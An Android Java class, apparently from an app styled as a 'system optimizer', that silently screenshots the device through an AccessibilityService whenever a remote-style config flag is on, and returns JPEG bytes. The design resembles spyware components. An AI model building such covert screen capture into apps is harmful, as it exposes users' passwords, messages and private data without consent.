package com.system.optimizer.handler;

import java.io.ByteArrayOutputStream;
import java.util.concurrent.CompletableFuture;

import com.system.optimizer.config.ConfigManager;
import com.system.optimizer.config.ConfigData;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.hardware.HardwareBuffer;
import android.os.Build;

public class ScreenshotCapture {
    private static final String TAG = "ScreenshotCapture";

    private final AccessibilityService service;

    private final ConfigManager configManager;

    public ScreenshotCapture(AccessibilityService delegate, ConfigManager configManager) {
        if (delegate == null) {
            throw new IllegalArgumentException("AccessibilityService cannot be null");
        }
        if (configManager == null) {
            throw new IllegalArgumentException("ConfigManager cannot be null");
        }
        this.service = delegate;
        this.configManager = configManager;
    }

    public CompletableFuture<byte[]> takeScreenshot() {
        CompletableFuture<byte[]> future = new CompletableFuture<>();

        // Only take screenshot if enabled in config
        ConfigData config = configManager.getCachedConfig();
        if (config == null || !config.isAutoScreenshotEnabled()) {
            future.complete(null);
            return future;
        }

        // Check if device supports screenshot functionality
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            future.complete(null);
            return future;
        }

        try {
            service.takeScreenshot(
                    android.view.Display.DEFAULT_DISPLAY,
                    service.getMainExecutor(),
                    new AccessibilityService.TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(AccessibilityService.ScreenshotResult result) {
                            try {
                                if (result == null) {
                                    future.complete(null);
                                    return;
                                }

                                HardwareBuffer buffer = result.getHardwareBuffer();
                                if (buffer == null) {
                                    future.complete(null);
                                    return;
                                }

                                ColorSpace colorSpace = result.getColorSpace();
                                if (colorSpace == null) {
                                    colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
                                }

                                Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);

                                buffer.close();
                                if (bitmap == null) {
                                    future.complete(null);
                                    return;
                                }

                                ConfigData cachedConfig = configManager.getCachedConfig();
                                byte[] imageData = bitmapToJpegBytes(bitmap, cachedConfig.getScreenshotQuality());
                                bitmap.recycle();

                                // Return raw bytes
                                future.complete(imageData);
                            } catch (Exception e) {
                                android.util.Log.e(TAG, "Error processing screenshot: " + e.getMessage());
                                future.complete(null);
                            }
                        }

                        @Override
                        public void onFailure(int error) {
                            android.util.Log.w(TAG, "Screenshot failed with error code: " + error);
                            future.complete(null);
                        }
                    });
        } catch (Exception e) {
            android.util.Log.e(TAG, "Error taking screenshot: " + e.getMessage());
            future.complete(null);
        }

        return future;
    }

    /**
     * Convert Bitmap to JPEG byte array
     */
    private static byte[] bitmapToJpegBytes(Bitmap bitmap, int quality) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
        return baos.toByteArray();
    }
}